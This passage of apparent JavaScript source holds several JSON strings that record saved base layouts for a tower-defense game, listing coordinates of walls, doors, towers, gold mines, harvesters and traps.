",\"tier\":1},\"105863636\":{\"x\":552,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"105863637\":{\"x\":-312,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"105863639\":{\"x\":-312,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105863640\":{\"x\":-360,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"105863641\":{\"x\":-408,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105863642\":{\"x\":-408,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"105863643\":{\"x\":-408,\"y\":-120,\"type\":\"Wall\",\"tier\":1},\"105863644\":{\"x\":-408,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"105863645\":{\"x\":-408,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105863646\":{\"x\":-408,\"y\":120,\"type\":\"Door\",\"tier\":1},\"105863647\":{\"x\":-408,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105863648\":{\"x\":-408,\"y\":312,\"type\":\"Door\",\"tier\":1},\"105863649\":{\"x\":-336,\"y\":288,\"type\":\"MagicTower\",\"tier\":1},\"105863650\":{\"x\":-288,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105863651\":{\"x\":-360,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"105863652\":{\"x\":-360,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105863653\":{\"x\":-192,\"y\":480,\"type\":\"ArrowTower\",\"tier\":1},\"105863654\":{\"x\":-96,\"y\":576,\"type\":\"MagicTower\",\"tier\":1},\"105863655\":{\"x\":0,\"y\":576,\"type\":\"CannonTower\",\"tier\":1},\"105863656\":{\"x\":96,\"y\":576,\"type\":\"MagicTower\",\"tier\":1},\"105863657\":{\"x\":192,\"y\":576,\"type\":\"CannonTower\",\"tier\":1},\"105863658\":{\"x\":288,\"y\":576,\"type\":\"MagicTower\",\"tier\":1},\"105863659\":{\"x\":-264,\"y\":456,\"type\":\"Wall\",\"tier\":1},\"105863660\":{\"x\":-312,\"y\":456,\"type\":\"Door\",\"tier\":1},\"105863661\":{\"x\":-264,\"y\":504,\"type\":\"Door\",\"tier\":1},\"105863662\":{\"x\":-168,\"y\":552,\"type\":\"Wall\",\"tier\":1},\"105863663\":{\"x\":-216,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863664\":{\"x\":-168,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863665\":{\"x\":360,\"y\":552,\"type\":\"Wall\",\"tier\":1},\"105863666\":{\"x\":408,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863667\":{\"x\":360,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863669\":{\"x\":456,\"y\":456,\"type\":\"Wall\",\"tier\":1},\"105863670\":{\"x\":504,\"y\":456,\"type\":\"Door\",\"tier\":1},\"105863671\":{\"x\":456,\"y\":504,\"type\":\"Door\",\"tier\":1},\"105863672\":{\"x\":552,\"y\":360,\"type\":\"Door\",\"tier\":1},\"105863673\":{\"x\":552,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105863674\":{\"x\":384,\"y\":480,\"type\":\"ArrowTower\",\"tier\":1},\"105863675\":{\"x\":384,\"y\":384,\"type\":\"ArrowTower\",\"tier\":1},\"105863676\":{\"x\":288,\"y\":384,\"type\":\"ArrowTower\",\"tier\":1},\"105863677\":{\"x\":288,\"y\":480,\"type\":\"ArrowTower\",\"tier\":1},\"105863678\":{\"x\":384,\"y\":96,\"type\":\"CannonTower\",\"tier\":1},\"105863679\":{\"x\":432,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105863680\":{\"x\":432,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105863754\":{\"x\":336,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105863775\":{\"x\":432,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105863785\":{\"x\":432,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105863840\":{\"x\":336,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105863893\":{\"x\":384,\"y\":-96,\"type\":\"CannonTower\",\"tier\":1},\"105864170\":{\"x\":-144,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105864176\":{\"x\":-240,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105864233\":{\"x\":-192,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105864236\":{\"x\":-288,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105864294\":{\"x\":-240,\"y\":-96,\"type\":\"CannonTower\",\"tier\":1},\"105864563\":{\"x\":-240,\"y\":96,\"type\":\"CannonTower\",\"tier\":1},\"105864576\":{\"x\":-288,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105864587\":{\"x\":-192,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105864608\":{\"x\":-240,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105864617\":{\"x\":-192,\"y\":384,\"type\":\"CannonTower\",\"tier\":1},\"105864635\":{\"x\":-48,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105864638\":{\"x\":48,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105864639\":{\"x\":144,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105864640\":{\"x\":240,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105864641\":{\"x\":-96,\"y\":-192,\"type\":\"BombTower\",\"tier\":1},\"105864642\":{\"x\":0,\"y\":-192,\"type\":\"BombTower\",\"tier\":1},\"105864643\":{\"x\":96,\"y\":-192,\"type\":\"BombTower\",\"tier\":1},\"105864644\":{\"x\":-96,\"y\":192,\"type\":\"BombTower\",\"tier\":1},\"105864645\":{\"x\":0,\"y\":192,\"type\":\"BombTower\",\"tier\":1},\"105864646\":{\"x\":-144,\"y\":288,\"type\":\"BombTower\",\"tier\":1},\"105864647\":{\"x\":-48,\"y\":288,\"type\":\"BombTower\",\"tier\":1},\"105864648\":{\"x\":168,\"y\":168,\"type\":\"Door\",\"tier\":1},\"105864649\":{\"x\":216,\"y\":168,\"type\":\"Door\",\"tier\":1},\"105864650\":{\"x\":216,\"y\":216,\"type\":\"Door\",\"tier\":1},\"105864651\":{\"x\":168,\"y\":216,\"type\":\"Door\",\"tier\":1},\"105864654\":{\"x\":264,\"y\":168,\"type\":\"Wall\",\"tier\":1},\"105864655\":{\"x\":216,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105864656\":{\"x\":216,\"y\":-120,\"type\":\"Wall\",\"tier\":1},\"105864657\":{\"x\":168,\"y\":-216,\"type\":\"Wall\",\"tier\":1},\"105864658\":{\"x\":168,\"y\":-168,\"type\":\"Wall\",\"tier\":1},\"105864659\":{\"x\":264,\"y\":216,\"type\":\"Wall\",\"tier\":1},\"105864660\":{\"x\":96,\"y\":192,\"type\":\"GoldMine\",\"tier\":1},\"105864661\":{\"x\":48,\"y\":288,\"type\":\"GoldMine\",\"tier\":1},\"105864662\":{\"x\":144,\"y\":288,\"type\":\"GoldMine\",\"tier\":1},\"105864663\":{\"x\":240,\"y\":288,\"type\":\"GoldMine\",\"tier\":1},\"105864664\":{\"x\":0,\"y\":384,\"type\":\"GoldMine\",\"tier\":1},\"105864665\":{\"x\":96,\"y\":384,\"type\":\"GoldMine\",\"tier\":1},\"105864666\":{\"x\":192,\"y\":384,\"type\":\"GoldMine\",\"tier\":1},\"105864667\":{\"x\":-96,\"y\":384,\"type\":\"ArrowTower\",\"tier\":1},\"105864668\":{\"x\":-96,\"y\":480,\"type\":\"ArrowTower\",\"tier\":1},\"105864669\":{\"x\":0,\"y\":480,\"type\":\"ArrowTower\",\"tier\":1},\"105864670\":{\"x\":96,\"y\":480,\"type\":\"ArrowTower\",\"tier\":1},\"105864671\":{\"x\":192,\"y\":480,\"type\":\"ArrowTower\",\"tier\":1},\"105864672\":{\"x\":240,\"y\":-192,\"type\":\"ArrowTower\",\"tier\":1},\"105864673\":{\"x\":288,\"y\":-96,\"type\":\"ArrowTower\",\"tier\":1},\"105864674\":{\"x\":288,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"105864675\":{\"x\":336,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105864676\":{\"x\":336,\"y\":288,\"type\":\"ArrowTower\",\"tier\":1},\"105864677\":{\"x\":216,\"y\":120,\"type\":\"Wall\",\"tier\":1},\"105864678\":{\"x\":216,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105864679\":{\"x\":552,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"105864680\":{\"x\":552,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"105864681\":{\"x\":600,\"y\":-24,\"type\":\"Door\",\"tier\":1},\"105864682\":{\"x\":600,\"y\":24,\"type\":\"SlowTrap\",\"tier\":1},\"105864683\":{\"x\":552,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105864684\":{\"x\":600,\"y\":72,\"type\":\"Door\",\"tier\":1},\"105864685\":{\"x\":552,\"y\":120,\"type\":\"Door\",\"tier\":1},\"105864686\":{\"x\":240,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105864687\":{\"x\":336,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105864688\":{\"x\":432,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105864689\":{\"x\":528,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105864690\":{\"x\":-72,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864691\":{\"x\":-24,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864692\":{\"x\":264,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864693\":{\"x\":216,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864694\":{\"x\":168,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864695\":{\"x\":120,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864696\":{\"x\":72,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864697\":{\"x\":24,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"105864698\":{\"x\":144,\"y\":96,\"type\":\"GoldMine\",\"tier\":1}}";
let scoreBase4PT70M = "{\"24499598\":{\"x\":96,\"y\":0,\"type\":\"Harvester\"},\"24499604\":{\"x\":-96,\"y\":0,\"type\":\"Harvester\"},\"24499605\":{\"x\":-192,\"y\":0,\"type\":\"Harvester\"},\"24499606\":{\"x\":-48,\"y\":-96,\"type\":\"Harvester\"},\"24499607\":{\"x\":0,\"y\":-192,\"type\":\"Harvester\"},\"24499608\":{\"x\":-48,\"y\":96,\"type\":\"Harvester\"},\"24499609\":{\"x\":0,\"y\":192,\"type\":\"Harvester\"},\"24499611\":{\"x\":48,\"y\":96,\"type\":\"ArrowTower\"},\"24499612\":{\"x\":48,\"y\":-96,\"type\":\"ArrowTower\"},\"24499615\":{\"x\":144,\"y\":-288,\"type\":\"ArrowTower\"},\"24499616\":{\"x\":144,\"y\":288,\"type\":\"ArrowTower\"},\"24499624\":{\"x\":192,\"y\":-192,\"type\":\"ArrowTower\"},\"24499626\":{\"x\":192,\"y\":-384,\"type\":\"ArrowTower\"},\"24499628\":{\"x\":144,\"y\":-480,\"type\":\"ArrowTower\"},\"24499629\":{\"x\":192,\"y\":192,\"type\":\"ArrowTower\"},\"24499630\":{\"x\":192,\"y\":384,\"type\":\"ArrowTower\"},\"24499633\":{\"x\":144,\"y\":480,\"type\":\"ArrowTower\"},\"24499636\":{\"x\":192,\"y\":576,\"type\":\"CannonTower\"},\"24499637\":{\"x\":240,\"y\":480,\"type\":\"CannonTower\"},\"24499638\":{\"x\":288,\"y\":576,\"type\":\"CannonTower\"},\"24499640\":{\"x\":336,\"y\":672,\"type\":\"CannonTower\"},\"24499641\":{\"x\":240,\"y\":672,\"type\":\"CannonTower\"},\"24499642\":{\"x\":288,\"y\":768,\"type\":\"MagicTower\"},\"24499644\":{\"x\":384,\"y\":768,\"type\":\"MagicTower\"},\"24499647\":{\"x\":432,\"y\":672,\"type\":\"MagicTower\"},\"24499648\":{\"x\":528,\"y\":672,\"type\":\"MagicTower\"},\"24499649\":{\"x\":480,\"y\":576,\"type\":\"MagicTower\"},\"24499650\":{\"x\":576,\"y\":576,\"type\":\"MagicTower\"},\"24499652\":{\"x\":672,\"y\":576,\"type\":\"MagicTower\"},\"24499653\":{\"x\":720,\"y\":480,\"type\":\"MagicTower\"},\"24499764\":{\"x\":336,\"y\":480,\"type\":\"ArrowTower\"},\"24499864\":{\"x\":384,\"y\":576,\"type\":\"ArrowTower\"},\"24500426\":{\"x\":432,\"y\":480,\"type\":\"BombTower\"},\"24500513\":{\"x\":528,\"y\":480,\"type\":\"CannonTower\"},\"24500698\":{\"x\":624,\"y\":480,\"type\":\"CannonTower\"},\"24501506\":{\"x\":240,\"y\":96,\"type\":\"BombTower\"},\"24501671\":{\"x\":288,\"y\":192,\"type\":\"BombTower\"},\"24501726\":{\"x\":240,\"y\":288,\"type\":\"BombTower\"},\"24501770\":{\"x\":288,\"y\":384,\"type\":\"BombTower\"},\"24502148\":{\"x\":336,\"y\":96,\"type\":\"BombTower\"},\"24502233\":{\"x\":336,\"y\":288,\"type\":\"BombTower\"},\"24502331\":{\"x\":384,\"y\":384,\"type\":\"BombTower\"},\"24502773\":{\"x\":480,\"y\":384,\"type\":\"BombTower\"},\"24502793\":{\"x\":576,\"y\":384,\"type\":\"BombTower\"},\"24502835\":{\"x\":672,\"y\":384,\"type\":\"BombTower\"},\"24503223\":{\"x\":696,\"y\":312,\"type\":\"Door\"},\"24503258\":{\"x\":744,\"y\":360,\"type\":\"Door\"},\"24503266\":{\"x\":744,\"y\":408,\"type\":\"Door\"},\"24503295\":{\"x\":792,\"y\":408,\"type\":\"Door\"},\"24503928\":{\"x\":624,\"y\":288,\"type\":\"BombTower\"},\"24503940\":{\"x\":528,\"y\":288,\"type\":\"CannonTower\"},\"24503942\":{\"x\":432,\"y\":96,\"type\":\"CannonTower\"},\"24503944\":{\"x\":480,\"y\":192,\"type\":\"CannonTower\"},\"24503947\":{\"x\":384,\"y\":192,\"type\":\"CannonTower\"},\"24503951\":{\"x\":432,\"y\":288,\"type\":\"CannonTower\"},\"24503959\":{\"x\":528,\"y\":96,\"type\":\"MagicTower\"},\"24503960\":{\"x\":576,\"y\":192,\"type\":\"MagicTower\"},\"24503985\":{\"x\":480,\"y\":0,\"type\":\"Harvester\"},\"24504001\":{\"x\":552,\"y\":-24,\"type\":\"Wall\"},\"24504007\":{\"x\":552,\"y\":24,\"type\":\"SlowTrap\"},\"24504021\":{\"x\":528,\"y\":-96,\"type\":\"MagicTower\"},\"24504022\":{\"x\":576,\"y\":-192,\"type\":\"MagicTower\"},\"24504024\":{\"x\":480,\"y\":-192,\"type\":\"CannonTower\"},\"24504028\":{\"x\":432,\"y\":-96,\"type\":\"CannonTower\"},\"24504046\":{\"x\":528,\"y\":-288,\"type\":\"CannonTower\"},\"24504049\":{\"x\":432,\"y\":-288,\"type\":\"CannonTower\"},\"24504055\":{\"x\":384,\"y\":-192,\"type\":\"CannonTower\"},\"24504061\":{\"x\":336,\"y\":-96,\"type\":\"BombTower\"},\"24504063\":{\"x\":240,\"y\":-96,\"type\":\"BombTower\"},\"24504066\":{\"x\":288,\"y\":-192,\"type\":\"BombTower\"},\"24504068\":{\"x\":336,\"y\":-288,\"type\":\"BombTower\"},\"24504069\":{\"x\":240,\"y\":-288,\"type\":\"BombTower\"},\"24504076\":{\"x\":288,\"y\":-384,\"type\":\"BombTower\"},\"24504078\":{\"x\":384,\"y\":-384,\"type\":\"BombTower\"},\"24504081\":{\"x\":480,\"y\":-384,\"type\":\"BombTower\"},\"24504082\":{\"x\":432,\"y\":-480,\"type\":\"BombTower\"},\"24504085\":{\"x\":576,\"y\":-384,\"type\":\"BombTower\"},\"24504086\":{\"x\":672,\"y\":-384,\"type\":\"BombTower\"},\"24504091\":{\"x\":624,\"y\":-288,\"type\":\"BombTower\"},\"24504096\":{\"x\":240,\"y\":-480,\"type\":\"ArrowTower\"},\"24504097\":{\"x\":336,\"y\":-480,\"type\":\"ArrowTower\"},\"24504107\":{\"x\":192,\"y\":-576,\"type\":\"CannonTower\"},\"24504108\":{\"x\":288,\"y\":-576,\"type\":\"CannonTower\"},\"24504109\":{\"x\":384,\"y\":-576,\"type\":\"CannonTower\"},\"24504111\":{\"x\":240,\"y\":-672,\"type\":\"CannonTower\"},\"24504112\":{\"x\":336,\"y\":-672,\"type\":\"CannonTower\"},\"24504113\":{\"x\":288,\"y\":-768,\"type\":\"MagicTower\"},\"24504114\":{\"x\":384,\"y\":-768,\"type\":\"MagicTower\"},\"24504115\":{\"x\":432,\"y\":-672,\"type\":\"MagicTower\"},\"24504116\":{\"x\":480,\"y\":-576,\"type\":\"MagicTower\"},\"24504117\":{\"x\":528,\"y\":-672,\"type\":\"MagicTower\"},\"24504118\":{\"x\":576,\"y\":-576,\"type\":\"MagicTower\"},\"24504122\":{\"x\":672,\"y\":-576,\"type\":\"MagicTower\"},\"24504123\":{\"x\":720,\"y\":-480,\"type\":\"MagicTower\"},\"24504124\":{\"x\":624,\"y\":-480,\"type\":\"CannonTower\"},\"24504125\":{\"x\":528,\"y\":-480,\"type\":\"CannonTower\"},\"24504126\":{\"x\":600,\"y\":-648,\"type\":\"Wall\"},\"24504127\":{\"x\":648,\"y\":-648,\"type\":\"Wall\"},\"24504130\":{\"x\":456,\"y\":-744,\"type\":\"Wall\"},\"24504131\":{\"x\":504,\"y\":-744,\"type\":\"Wall\"},\"24504133\":{\"x\":744,\"y\":-552,\"type\":\"Wall\"},\"24504136\":{\"x\":792,\"y\":-456,\"type\":\"Door\"},\"24504137\":{\"x\":792,\"y\":-408,\"type\":\"Door\"},\"24504138\":{\"x\":744,\"y\":-408,\"type\":\"Door\"},\"24504139\":{\"x\":744,\"y\":-360,\"type\":\"Door\"},\"24504140\":{\"x\":696,\"y\":-312,\"type\":\"Door\"},\"24504142\":{\"x\":456,\"y\":744,\"type\":\"Wall\"},\"24504143\":{\"x\":504,\"y\":744,\"type\":\"Wall\"},\"24504144\":{\"x\":600,\"y\":648,\"type\":\"Wall\"},\"24504145\":{\"x\":648,\"y\":648,\"type\":\"Wall\"},\"24504146\":{\"x\":600,\"y\":-120,\"type\":\"SlowTrap\"}}";
let scoreBase4P40M = "{\"220717259\":{\"x\":-96,\"y\":48,\"type\":\"ArrowTower\"},\"220717260\":{\"x\":-192,\"y\":96,\"type\":\"ArrowTower\"},\"220717261\":{\"x\":-96,\"y\":144,\"type\":\"ArrowTower\"},\"220717262\":{\"x\":-288,\"y\":144,\"type\":\"ArrowTower\"},\"220717265\":{\"x\":96,\"y\":48,\"type\":\"ArrowTower\"},\"220717266\":{\"x\":96,\"y\":144,\"type\":\"ArrowTower\"},\"220717267\":{\"x\":192,\"y\":96,\"type\":\"ArrowTower\"},\"220717269\":{\"x\":288,\"y\":144,\"type\":\"ArrowTower\"},\"220717270\":{\"x\":-384,\"y\":96,\"type\":\"ArrowTower\"},\"220717271\":{\"x\":-480,\"y\":144,\"type\":\"ArrowTower\"},\"220717272\":{\"x\":-384,\"y\":192,\"type\":\"ArrowTower\"},\"220717273\":{\"x\":-480,\"y\":240,\"type\":\"ArrowTower\"},\"220717274\":{\"x\":-384,\"y\":288,\"type\":\"ArrowTower\"},\"220717275\":{\"x\":-480,\"y\":336,\"type\":\"ArrowTower\"},\"220717276\":{\"x\":-480,\"y\":432,\"type\":\"ArrowTower\"},\"220717277\":{\"x\":-576,\"y\":384,\"type\":\"ArrowTower\"},\"220717278\":{\"x\":-576,\"y\":192,\"type\":\"CannonTower\"},\"220717279\":{\"x\":-672,\"y\":240,\"type\":\"CannonTower\"},\"220717280\":{\"x\":-672,\"y\":336,\"type\":\"CannonTower\"},\"220717281\":{\"x\":-576,\"y\":288,\"type\":\"CannonTower\"},\"220717282\":{\"x\":-768,\"y\":288,\"type\":\"MagicTower\"},\"220717283\":{\"x\":-768,\"y\":384,\"type\":\"MagicTower\"},\"220717284\":{\"x\":-672,\"y\":432,\"type\":\"MagicTower\"},\"220717285\":{\"x\":-672,\"y\":528,\"type\":\"MagicTower\"},\"220717286\":{\"x\":-576,\"y\":480,\"type\":\"MagicTower\"},\"220717287\":{\"x\":-576,\"y\":576,\"type\":\"MagicTower\"},\"220717288\":{\"x\":-576,\"y\":672,\"type\":\"MagicTower\"},\"220717289\":{\"x\":-480,\"y\":720,\"type\":\"MagicTower\"},\"220717290\":{\"x\":-480,\"y\":528,\"type\":\"CannonTower\"},\"220717291\":{\"x\":-480,\"y\":624,\"type\":\"CannonTower\"},\"220717292\":{\"x\":-456,\"y\":792,\"type\":\"Door\"},\"220717293\":{\"x\":-408,\"y\":792,\"type\":\"Door\"},\"220717294\":{\"x\":-408,\"y\":744,\"type\":\"Door\"},\"220717295\":{\"x\":-360,\"y\":744,\"type\":\"Door\"},\"220717296\":{\"x\":-312,\"y\":744,\"type\":\"Door\"},\"220717297\":{\"x\":-312,\"y\":696,\"type\":\"Door\"},\"220717298\":{\"x\":-264,\"y\":696,\"type\":\"Door\"},\"220717299\":{\"x\":-216,\"y\":696,\"type\":\"Door\"},\"220717300\":{\"x\":-216,\"y\":648,\"type\":\"Door\"},\"220717301\":{\"x\":-168,\"y\":648,\"type\":\"Door\"},\"220717302\":{\"x\":168,\"y\":648,\"type\":\"Door\"},\"220717303\":{\"x\":216,\"y\":648,\"type\":\"Door\"},\"220717304\":{\"x\":216,\"y\":696,\"type\":\"Door\"},\"220717305\":{\"x\":264,\"y\":696,\"type\":\"Door\"},\"220717306\":{\"x\":312,\"y\":696,\"type\":\"Door\"},\"220717307\":{\"x\":312,\"y\":744,\"type\":\"Door\"},\"220717382\":{\"x\":360,\"y\":744,\"type\":\"Door\"},\"220717384\":{\"x\":408,\"y\":744,\"type\":\"Door\"},\"220717462\":{\"x\":456,\"y\":744,\"type\":\"Wall\"},\"220717466\":{\"x\":456,\"y\":696,\"type\":\"Wall\"},\"220717476\":{\"x\":504,\"y\":696,\"type\":\"Wall\"},\"220717960\":{\"x\":552,\"y\":648,\"type\":\"Wall\"},\"220717962\":{\"x\":576,\"y\":576,\"type\":\"MagicTower\"},\"220717963\":{\"x\":672,\"y\":528,\"type\":\"MagicTower\"},\"220717964\":{\"x\":672,\"y\":432,\"type\":\"CannonTower\"},\"220717965\":{\"x\":576,\"y\":480,\"type\":\"CannonTower\"},\"220717966\":{\"x\":672,\"y\":336,\"type\":\"MagicTower\"},\"220717967\":{\"x\":576,\"y\":384,\"type\":\"MagicTower\"},\"220717968\":{\"x\":576,\"y\":288,\"type\":\"CannonTower\"},\"220717969\":{\"x\":480,\"y\":240,\"type\":\"CannonTower\"},\"220717970\":{\"x\":480,\"y\":336,\"type\":\"CannonTower\"},\"220717971\":{\"x\":384,\"y\":192,\"type\":\"ArrowTower\"},\"220717972\":{\"x\":384,\"y\":288,\"type\":\"ArrowTower\"},\"220717974\":{\"x\":-384,\"y\":480,\"type\":\"CannonTower\"},\"220717975\":{\"x\":-288,\"y\":528,\"type\":\"CannonTower\"},\"220717976\":{\"x\":-192,\"y\":576,\"type\":\"CannonTower\"},\"220717977\":{\"x\":-192,\"y\":480,\"type\":\"CannonTower\"},\"220717978\":{\"x\":-96,\"y\":432,\"type\":\"CannonTower\"},\"220717979\":{\"x\":96,\"y\":432,\"type\":\"CannonTower\"},\"220717980\":{\"x\":192,\"y\":480,\"type\":\"CannonTower\"},\"220717981\":{\"x\":192,\"y\":576,\"type\":\"CannonTower\"},\"220717982\":{\"x\":288,\"y\":528,\"type\":\"CannonTower\"},\"220717983\":{\"x\":384,\"y\":480,\"type\":\"CannonTower\"},\"220717984\":{\"x\":480,\"y\":432,\"type\":\"CannonTower\"},\"220717985\":{\"x\":480,\"y\":528,\"type\":\"CannonTower\"},\"220717986\":{\"x\":480,\"y\":624,\"type\":\"CannonTower\"},\"220717987\":{\"x\":-384,\"y\":576,\"type\":\"BombTower\"},\"220717988\":{\"x\":-384,\"y\":672,\"type\":\"BombTower\"},\"220717989\":{\"x\":-384,\"y\":384,\"type\":\"BombTower\"},\"220717990\":{\"x\":-288,\"y\":432,\"type\":\"BombTower\"},\"220717991\":{\"x\":-288,\"y\":336,\"type\":\"BombTower\"},\"220717992\":{\"x\":-288,\"y\":240,\"type\":\"BombTower\"},\"220717993\":{\"x\":-288,\"y\":624,\"type\":\"BombTower\"},\"220717994\":{\"x\":-192,\"y\":384,\"type\":\"BombTower\"},\"220717995\":{\"x\":-192,\"y\":288,\"type\":\"BombTower\"},\"220717996\":{\"x\":-192,\"y\":192,\"type\":\"BombTower\"},\"220717997\":{\"x\":-96,\"y\":240,\"type\":\"BombTower\"},\"220717998\":{\"x\":-96,\"y\":336,\"type\":\"BombTower\"},\"220717999\":{\"x\":96,\"y\":240,\"type\":\"BombTower\"},\"220718000\":{\"x\":96,\"y\":336,\"type\":\"BombTower\"},\"220718001\":{\"x\":192,\"y\":192,\"type\":\"BombTower\"},\"220718002\":{\"x\":192,\"y\":288,\"type\":\"BombTower\"},\"220718003\":{\"x\":192,\"y\":384,\"type\":\"BombTower\"},\"220718004\":{\"x\":288,\"y\":432,\"type\":\"BombTower\"},\"220718005\":{\"x\":288,\"y\":336,\"type\":\"BombTower\"},\"220718006\":{\"x\":288,\"y\":240,\"type\":\"BombTower\"},\"220718007\":{\"x\":384,\"y\":384,\"type\":\"BombTower\"},\"220718008\":{\"x\":288,\"y\":624,\"type\":\"BombTower\"},\"220718009\":{\"x\":384,\"y\":576,\"type\":\"BombTower\"},\"220718010\":{\"x\":384,\"y\":672,\"type\":\"BombTower\"},\"220718011\":{\"x\":96,\"y\":528,\"type\":\"MagicTower\"},\"220718012\":{\"x\":-96,\"y\":528,\"type\":\"MagicTower\"},\"220718013\":{\"x\":408,\"y\":792,\"type\":\"Door\"},\"220718786\":{\"x\":24,\"y\":552,\"type\":\"SlowTrap\"},\"220719311\":{\"x\":-192,\"y\":0,\"type\":\"Harvester\"},\"220719312\":{\"x\":-144,\"y\":-96,\"type\":\"Harvester\"},\"220719313\":{\"x\":-48,\"y\":-144,\"type\":\"Harvester\"},\"220719314\":{\"x\":48,\"y\":-144,\"type\":\"Harvester\"},\"220719315\":{\"x\":144,\"y\":-96,\"type\":\"Harvester\"},\"220719316\":{\"x\":192,\"y\":0,\"type\":\"Harvester\"},\"220719317\":{\"x\":0,\"y\":480,\"type\":\"Harvester\"},\"220719318\":{\"x\":0,\"y\":384,\"type\":\"Harvester\"},\"220719319\":{\"x\":-120,\"y\":600,\"type\":\"SlowTrap\"},\"220719320\":{\"x\":-72,\"y\":600,\"type\":\"SlowTrap\"},\"220719321\":{\"x\":-24,\"y\":600,\"type\":\"SlowTrap\"},\"220719322\":{\"x\":72,\"y\":600,\"type\":\"SlowTrap\"},\"220719323\":{\"x\":120,\"y\":600,\"type\":\"SlowTrap\"},\"220719324\":{\"x\":24,\"y\":600,\"type\":\"SlowTrap\"},\"220720434\":{\"x\":-744,\"y\":456,\"type\":\"Wall\"},\"220720450\":{\"x\":-744,\"y\":504,\"type\":\"Wall\"},\"220720488\":{\"x\":-648,\"y\":600,\"type\":\"Wall\"},\"220720501\":{\"x\":-648,\"y\":648,\"type\":\"Wall\"},\"220720532\":{\"x\":-552,\"y\":744,\"type\":\"Wall\"},\"220720669\":{\"x\":-24,\"y\":552,\"type\":\"Door\"}}";
let scoreBase4PT80MBottom = "{\"201922435\":{\"x\":-96,\"y\":48,\"type\":\"ArrowTower\"},\"201922436\":{\"x\":-192,\"y\":96,\"type\":\"ArrowTower\"},\"201922437\":{\"x\":96,\"y\":48,\"type\":\"ArrowTower\"},\"201922438\":{\"x\":192,\"y\":96,\"type\":\"ArrowTower\"},\"201922441\":{\"x\":-192,\"y\":0,\"type\":\"Harvester\"},\"201922444\":{\"x\":-96,\"y\":-96,\"type\":\"Harvester\"},\"201922445\":{\"x\":0,\"y\":-144,\"type\":\"Harvester\"},\"201922446\":{\"x\":96,\"y\":-96,\"type\":\"Harvester\"},\"201922447\":{\"x\":192,\"y\":0,\"type\":\"Harvester\"},\"201922448\":{\"x\":-288,\"y\":144,\"type\":\"ArrowTower\"},\"201922449\":{\"x\":-384,\"y\":96,\"type\":\"ArrowTower\"},\"201922450\":{\"x\":-384,\"y\":192,\"type\":\"ArrowTower\"},\"201922451\":{\"x\":-480,\"y\":144,\"type\":\"CannonTower\"},\"201922452\":{\"x\":-576,\"y\":192,\"type\":\"CannonTower\"},\"201922453\":{\"x\":-480,\"y\":240,\"type\":\"CannonTower\"},\"201922454\":{\"x\":-576,\"y\":288,\"type\":\"CannonTower\"},\"201922457\":{\"x\":-672,\"y\":240,\"type\":\"MagicTower\"},\"201922458\":{\"x\":-768,\"y\":288,\"type\":\"MagicTower\"},\"201922459\":{\"x\":-768,\"y\":384,\"type\":\"MagicTower\"},\"201922460\":{\"x\":-672,\"y\":336,\"type\":\"MagicTower\"},\"201922461\":{\"x\":-672,\"y\":432,\"type\":\"MagicTower\"},\"201922462\":{\"x\":-672,\"y\":528,\"type\":\"MagicTower\"},\"201922464\":{\"x\":-576,\"y\":576,\"type\":\"MagicTower\"},\"201922465\":{\"x\":-576,\"y\":672,\"type\":\"MagicTower\"},\"201922466\":{\"x\":-480,\"y\":720,\"type\":\"MagicTower\"},\"201922467\":{\"x\":-744,\"y\":456,\"type\":\"Wall\"},\"201922468\":{\"x\":-744,\"y\":504,\"type\":\"Wall\"},\"201922469\":{\"x\":-648,\"y\":600,\"type\":\"Wall\"},\"201922470\":{\"x\":-648,\"y\":648,\"type\":\"Wall\"},\"201922471\":{\"x\":-552,\"y\":744,\"type\":\"